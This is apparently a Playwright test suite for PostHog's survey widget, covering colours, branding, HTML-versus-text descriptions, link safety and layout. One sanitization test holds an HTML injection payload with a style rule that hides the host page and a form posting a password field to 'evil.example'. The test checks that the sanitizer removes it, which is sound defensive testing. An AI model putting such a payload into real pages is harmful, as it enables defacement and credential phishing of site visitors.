import { pollUntilEventCaptured } from '../utils/event-capture-utils'
import { expect, test, type WindowWithPostHog } from '../utils/posthog-playwright-test-base'
import { start } from '../utils/setup'

const startOptions = {
    options: {},
    flagsResponseOverrides: {
        surveys: true,
    },
    url: './playground/cypress/index.html',
}

const openTextQuestion = {
    type: 'open',
    question: 'What feedback do you have for us?',
    description: 'plain text description',
    id: 'open_text_1',
}

const questionWithLargeHtmlContent = {
    type: 'open',
    question: 'What feedback do you have for us?',
    description: `<p>ThisShouldWrapProperly${'a'.repeat(100)}</p><img width="1000" height="100" alt="Large image" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">`,
    descriptionContentType: 'html',
    id: 'open_text_2',
}

const linkQuestionWithHTMLContentType = {
    type: 'link',
    question: 'Book an interview with us',
    link: 'https://posthog.com',
    description: '<h2>html description</h2>',
    descriptionContentType: 'html',
    id: 'link_html_1',
}

const linkQuestionWithNoContentType = {
    type: 'link',
    question: 'Book an interview with us',
    link: 'https://posthog.com',
    description: '<h2>html description</h2>',
    id: 'link_no_content_1',
}

const linkQuestionWithTextContentType = {
    type: 'link',
    question: 'Book an interview with us',
    link: 'https://posthog.com',
    description: '<h2>html description</h2>',
    descriptionContentType: 'text',
    id: 'link_text_1',
}

const appearanceWithThanks = {
    displayThankYouMessage: true,
    thankyouMessageHeader: 'Thanks!',
    thankyouMessageBody: 'We appreciate your feedback.',
}

const black = 'rgb(0, 0, 0)'
const white = 'rgb(255, 255, 255)'

test.describe('surveys - customization', () => {
    test('automatically sets text color based on background color', async ({ page, context }) => {
        const surveysAPICall = page.route('**/surveys/**', async (route) => {
            await route.fulfill({
                json: {
                    surveys: [
                        {
                            id: '123',
                            name: 'Test survey',
                            type: 'popover',
                            start_date: '2021-01-01T00:00:00Z',
                            questions: [openTextQuestion],
                            appearance: {
                                backgroundColor: '#000000',
                                submitButtonColor: '#ffffff',
                            },
                        },
                    ],
                },
            })
        })

        await start(startOptions, page, context)
        await surveysAPICall

        await expect(page.locator('.PostHogSurvey-123').locator('.survey-form')).toBeVisible()
        await expect(page.locator('.PostHogSurvey-123').locator('.survey-question')).toHaveText(
            'What feedback do you have for us?'
        )
        await expect(page.locator('.PostHogSurvey-123').locator('.survey-question-description')).toHaveText(
            'plain text description'
        )

        await expect(page.locator('.PostHogSurvey-123').locator('.footer-branding')).toBeVisible()

        await expect(page.locator('.PostHogSurvey-123').locator('.survey-form')).toHaveCSS('background-color', black)
        await expect(page.locator('.PostHogSurvey-123').locator('.survey-form')).toHaveCSS('color', white)

        await page.locator('.PostHogSurvey-123').locator('textarea').type('This is great!')

        await page.locator('.PostHogSurvey-123').locator('.form-submit').click()

        await pollUntilEventCaptured(page, 'survey sent')
    })

    test('does not show posthog logo if whiteLabel exists', async ({ page, context }) => {
        const surveysAPICall = page.route('**/surveys/**', async (route) => {
            await route.fulfill({
                json: {
                    surveys: [
                        {
                            id: '123',
                            name: 'Test survey',
                            type: 'popover',
                            start_date: '2021-01-01T00:00:00Z',
                            questions: [openTextQuestion],
                            appearance: { whiteLabel: true },
                        },
                    ],
                },
            })
        })

        await start(startOptions, page, context)
        await surveysAPICall

        await expect(page.locator('.PostHogSurvey-123').locator('.survey-form')).toBeVisible()
        await expect(page.locator('.PostHogSurvey-123').locator('.footer-branding')).not.toBeVisible()
    })

    test('allows html customization for question and thank you element description', async ({ page, context }) => {
        const surveysAPICall = page.route('**/surveys/**', async (route) => {
            await route.fulfill({
                json: {
                    surveys: [
                        {
                            id: '123',
                            name: 'Test survey',
                            type: 'popover',
                            start_date: '2021-01-01T00:00:00Z',
                            questions: [linkQuestionWithHTMLContentType],
                        },
                    ],
                },
            })
        })

        await start(startOptions, page, context)
        await surveysAPICall

        await expect(page.locator('.PostHogSurvey-123').locator('.survey-form')).toBeVisible()
        await expect(page.locator('.PostHogSurvey-123').locator('.survey-question')).toHaveText(
            'Book an interview with us'
        )
        await expect(page.locator('.PostHogSurvey-123').locator('.survey-question-description h2')).toHaveText(
            'html description'
        )
    })

    test('allows html customization for question missing the descriptionContentType field (backfilling against surveys made before we introduced this field)', async ({
        page,
        context,
    }) => {
        const surveysAPICall = page.route('**/surveys/**', async (route) => {
            await route.fulfill({
                json: {
                    surveys: [
                        {
                            id: '123',
                            name: 'Test survey',
                            type: 'popover',
                            start_date: '2021-01-01T00:00:00Z',
                            questions: [linkQuestionWithNoContentType],
                        },
                    ],
                },
            })
        })

        await start(startOptions, page, context)
        await surveysAPICall

        await expect(page.locator('.PostHogSurvey-123').locator('.survey-form')).toBeVisible()
        await expect(page.locator('.PostHogSurvey-123').locator('.survey-question')).toHaveText(
            'Book an interview with us'
        )
        await expect(page.locator('.PostHogSurvey-123').locator('.survey-question-description h2')).toHaveText(
            'html description'
        )
    })

    test('allows html customization for thank you message body', async ({ page, context }) => {
        const surveysAPICall = page.route('**/surveys/**', async (route) => {
            await route.fulfill({
                json: {
                    surveys: [
                        {
                            id: '123',
                            name: 'Test survey',
                            type: 'popover',
                            start_date: '2021-01-01T00:00:00Z',
                            questions: [openTextQuestion],
                            appearance: {
                                ...appearanceWithThanks,
                                thankYouMessageDescription: '<h3>html thank you message!</h3>',
                                thankYouMessageDescriptionContentType: 'html',
                            },
                        },
                    ],
                },
            })
        })

        await start(startOptions, page, context)
        await surveysAPICall

        await expect(page.locator('.PostHogSurvey-123').locator('.survey-form')).toBeVisible()
        await expect(page.locator('.PostHogSurvey-123').locator('.survey-question')).toHaveText(
            'What feedback do you have for us?'
        )
        await expect(page.locator('.PostHogSurvey-123').locator('.survey-question-description')).toHaveText(
            'plain text description'
        )
        await page.locator('.PostHogSurvey-123').locator('textarea').type('This is great!')
        await page.locator('.PostHogSurvey-123').locator('.form-submit').click()
        await expect(page.locator('.PostHogSurvey-123').locator('.thank-you-message-body h3')).toHaveText(
            'html thank you message!'
        )
        await pollUntilEventCaptured(page, 'survey sent')
    })

    test('does not render html customization for question descriptions if the question.survey-question-descriptionContentType does not permit it', async ({
        page,
        context,
    }) => {
        const surveysAPICall = page.route('**/surveys/**', async (route) => {
            await route.fulfill({
                json: {
                    surveys: [
                        {
                            id: '123',
                            name: 'Test survey',
                            type: 'popover',
                            start_date: '2021-01-01T00:00:00Z',
                            questions: [linkQuestionWithTextContentType],
                        },
                    ],
                },
            })
        })

        await start(startOptions, page, context)
        await surveysAPICall

        await expect(page.locator('.PostHogSurvey-123').locator('.survey-form')).toBeVisible()
        await expect(page.locator('.PostHogSurvey-123').locator('.survey-question')).toHaveText(
            'Book an interview with us'
        )
        await expect(page.locator('.PostHogSurvey-123').locator('.survey-question-description h2')).toHaveCount(0)
        await expect(page.locator('.PostHogSurvey-123').locator('.survey-question-description')).toHaveText(
            '<h2>html description</h2>'
        )
    })

    test('does not render html customization for thank you message body if the question.thankYouMessageDescriptionContentType does not permit it', async ({
        page,
        context,
    }) => {
        const surveysAPICall = page.route('**/surveys/**', async (route) => {
            await route.fulfill({
                json: {
                    surveys: [
                        {
                            id: '123',
                            name: 'Test survey',
                            type: 'popover',
                            start_date: '2021-01-01T00:00:00Z',
                            questions: [openTextQuestion],
                            appearance: {
                                ...appearanceWithThanks,
                                thankYouMessageDescription: '<h3>html thank you message!</h3>',
                                thankYouMessageDescriptionContentType: 'text',
                            },
                        },
                    ],
                },
            })
        })

        await start(startOptions, page, context)
        await surveysAPICall

        await expect(page.locator('.PostHogSurvey-123').locator('.survey-form')).toBeVisible()
        await expect(page.locator('.PostHogSurvey-123').locator('.survey-question')).toHaveText(
            'What feedback do you have for us?'
        )
        await expect(page.locator('.PostHogSurvey-123').locator('.survey-question-description')).toHaveText(
            'plain text description'
        )
        await page.locator('.PostHogSurvey-123').locator('textarea').type('This is great!')
        await page.locator('.PostHogSurvey-123').locator('.form-submit').click()
        await expect(page.locator('.PostHogSurvey-123').locator('.thank-you-message-body h3')).toHaveCount(0)
        await expect(page.locator('.PostHogSurvey-123').locator('.thank-you-message-body')).toHaveText(
            '<h3>html thank you message!</h3>'
        )
        await pollUntilEventCaptured(page, 'survey sent')
    })

    test('opens sanitized description links in a new tab without an opener', async ({ page, context }) => {
        let referrer: string | undefined
        await context.route('https://example.com/help', (route) => {
            referrer = route.request().headers()['referer']
            return route.fulfill({ body: 'Help' })
        })
        await page.route('**/surveys/**', (route) =>
            route.fulfill({
                json: {
                    surveys: [
                        {
                            id: '123',
                            name: 'Test survey',
                            type: 'popover',
                            start_date: '2021-01-01T00:00:00Z',
                            questions: [
                                {
                                    ...openTextQuestion,
                                    description: '<a href="https://example.com/help" target="_blank">Help</a>',
                                    descriptionContentType: 'html',
                                },
                            ],
                        },
                    ],
                },
            })
        )
        await start({ ...startOptions, url: '/playground/cypress/index.html' }, page, context)
        await page.evaluate(() => {
            const meta = document.createElement('meta')
            meta.name = 'referrer'
            meta.content = 'origin'
            document.head.appendChild(meta)
        })
        const originalUrl = page.url()
        const link = page.locator('.PostHogSurvey-123 .survey-question-description a')
        await expect(link).toHaveAttribute('target', '_blank')

        const [popup] = await Promise.all([context.waitForEvent('page'), link.click()])
        await popup.waitForLoadState()
        expect(referrer).toBe(`${new URL(originalUrl).origin}/`)
        await expect(link).toHaveAttribute('rel', 'noopener')
        expect(await popup.evaluate(() => window.opener)).toBeNull()
        await expect(page).toHaveURL(originalUrl)
        await expect(page.locator('.PostHogSurvey-123 .survey-form')).toBeVisible()
        await popup.close()
    })

    test('inline description HTML cannot style the host page or inject form controls', async ({ page, context }) => {
        await page.route('**/surveys/**', (route) =>
            route.fulfill({
                json: {
                    surveys: [
                        {
                            id: '123',
                            name: 'Test survey',
                            type: 'popover',
                            start_date: '2021-01-01T00:00:00Z',
                            questions: [
                                {
                                    ...openTextQuestion,
                                    description:
                                        '<p>Rate us</p><style>body{display:none !important}</style>' +
                                        '<form action="https://evil.example/c"><input type="password">' +
                                        '<button>Send</button><textarea>Secret</textarea>' +
                                        '<select><option>Choice</option></select></form>' +
                                        '<video controls src="/video.mp4"></video>' +
                                        '<span id="survey-host" name="surveyHost" class="host-style" data-secret="value" ' +
                                        'aria-label="Host" style="color: red">Styled text</span>',
                                    descriptionContentType: 'html',
                                },
                            ],
                        },
                    ],
                },
            })
        )
        await start({ ...startOptions, options: { disable_surveys_automatic_display: true } }, page, context)
        await page.evaluate(
            () =>
                new Promise<void>((resolve) => {
                    const posthog = (window as WindowWithPostHog).posthog!
                    posthog.onSurveysLoaded(() => {
                        posthog.renderSurvey('123', '#survey')
                        resolve()
                    })
                })
        )

        await expect(page.locator('body')).not.toHaveCSS('display', 'none')
        const description = page.locator('#survey .survey-question-description')
        await expect(description).toBeVisible()
        await expect(
            description.locator(
                'style, form, input, button, textarea, select, video, [id], [name], [class], [data-secret], [aria-label]'
            )
        ).toHaveCount(0)
        await expect(description.locator('p')).toHaveText('Rate us')
        await expect(description.locator('span')).toHaveCSS('color', 'rgb(255, 0, 0)')
        await expect(page.locator('#survey .survey-form textarea')).toBeVisible()
        await expect(page.locator('#survey .form-submit')).toBeVisible()
    })

    test('properly wraps long html content in question description', async ({ page, context }) => {
        const surveysAPICall = page.route('**/surveys/**', async (route) => {
            await route.fulfill({
                json: {
                    surveys: [
                        {
                            id: '123',
                            name: 'Test survey',
                            type: 'popover',
                            start_date: '2021-01-01T00:00:00Z',
                            questions: [questionWithLargeHtmlContent],
                            appearance: {
                                backgroundColor: '#000000',
                                submitButtonColor: '#ffffff',
                            },
                        },
                    ],
                },
            })
        })

        await start(startOptions, page, context)
        await surveysAPICall

        const questionDesc = page.locator('.PostHogSurvey-123 .survey-question-description')
        const image = page.locator('.PostHogSurvey-123 .survey-question-description img')
        const paragraph = page.locator('.PostHogSurvey-123 .survey-question-description p')

        await expect(questionDesc).toBeVisible()
        await expect(image).toBeVisible()
        await expect(paragraph).toBeVisible()

        await expect(questionDesc).toHaveCSS('word-wrap', 'break-word')
        await expect(questionDesc).toHaveCSS('overflow-wrap', 'break-word')

        const descBox = await questionDesc.boundingBox()
        const imageBox = await image.boundingBox()
        const surveyFormBox = await page.locator('.PostHogSurvey-123 .survey-form').boundingBox()

        expect(descBox).not.toBeNull()
        expect(imageBox).not.toBeNull()
        expect(surveyFormBox).not.toBeNull()

        if (descBox && imageBox && surveyFormBox) {
            expect(descBox.width).toBeLessThanOrEqual(surveyFormBox.width)
            expect(imageBox.width).toBeLessThanOrEqual(descBox.width)
            expect(imageBox.width).toBeLessThan(1000)
        }
    })
})
